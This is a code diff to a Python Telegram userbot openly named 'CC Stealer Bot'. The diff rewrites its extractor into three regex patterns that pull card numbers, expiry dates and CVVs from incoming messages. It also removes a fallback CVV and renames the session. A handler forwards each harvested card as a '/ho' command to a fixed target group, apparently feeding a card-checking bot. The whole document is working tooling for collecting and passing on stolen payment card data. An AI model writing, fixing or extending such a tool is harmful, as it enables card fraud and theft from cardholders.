@@ -12,41 +12,48 @@ TARGET_GROUP = -1002882603089    # Jaha bhejna hai
 OWNER_ID = 7835198116
 # =============================================
 
-# To avoid duplicates
 seen = set()
 running = False
 
-# Initialize client
-client = TelegramClient("cc_stealer", API_ID, API_HASH)
+client = TelegramClient("cc_stealer_fixed", API_ID, API_HASH)
 
 # --- Ultimate card extractor function ---
 def extract_combos(text):
-    """
-    Universal extractor for almost all card formats
-    """
-    pattern = r"""
-    (\d{13,16})                         # CC number
-    .*?                                  # anything in between
-    (?:CVV:|CVC:|cvv\s*:\s*)?           # optional CVV label
-    (\d{3,4})?                           # CVV (optional)
-    .*?                                  # anything in between
-    (?:EXP:|EXPIRE:|Exp\. month:|Exp\. year:|exp\s*:\s*)?  # optional expiry labels
-    (\d{1,2})                            # month
-    /                                     # separator
-    (\d{2,4})                            # year
-    """
-    
-    matches = re.findall(pattern, text, re.DOTALL | re.IGNORECASE | re.VERBOSE)
-    
     results = []
-    for ccnum, cvv, month, year in matches:
+
+    # --- Pattern 1: single-line | separated combo ---
+    pattern1 = r'(\d{13,16})\|(\d{1,2})[ /]?(\d{2,4})\|(\d{3,4})'
+    matches1 = re.findall(pattern1, text)
+    for ccnum, month, year, cvv in matches1:
         month = month.zfill(2)
         year = year[-2:]
-        cvv = cvv if cvv else "000"  # default if CVV missing
         combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
         if combo not in seen:
             seen.add(combo)
             results.append(combo)
+
+    # --- Pattern 2: multi-line labeled combo ---
+    pattern2 = r'(\d{13,16}).*?(?:CVV:|CVC:|cvv\s*:\s*)(\d{3,4}).*?(?:EXP:|EXPIRE:|Exp\. month:|exp\s*:\s*)(\d{1,2})[ /](\d{2,4})'
+    matches2 = re.findall(pattern2, text, re.DOTALL | re.IGNORECASE)
+    for ccnum, cvv, month, year in matches2:
+        month = month.zfill(2)
+        year = year[-2:]
+        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
+        if combo not in seen:
+            seen.add(combo)
+            results.append(combo)
+
+    # --- Pattern 3: multi-line without labels (CC \n MM/YY \n CVV) ---
+    pattern3 = r'(\d{13,16})\s*\n\s*(\d{1,2})/(\d{2,4})\s*\n\s*(\d{3,4})'
+    matches3 = re.findall(pattern3, text, re.DOTALL)
+    for ccnum, month, year, cvv in matches3:
+        month = month.zfill(2)
+        year = year[-2:]
+        combo = f"/ho {ccnum}|{month}|{year}|{cvv}"
+        if combo not in seen:
+            seen.add(combo)
+            results.append(combo)
+
     return results
 
 # --- Commands ---
@@ -74,17 +81,17 @@ async def handler(event):
     global running
     if not running:
         return
-    
+
     text = event.raw_text
     combos = extract_combos(text)
-    
+
     for combo in combos:
         await client.send_message(TARGET_GROUP, combo)
         print("Forwarded:", combo)
 
 # --- Main ---
 async def main():
-    print("Starting CC Stealer Bot...")
+    print("Starting CC Stealer Bot (Fixed)...")
     await client.start(PHONE_NUMBER)
     print("Bot is ready. Waiting for /start stealer command...")
 
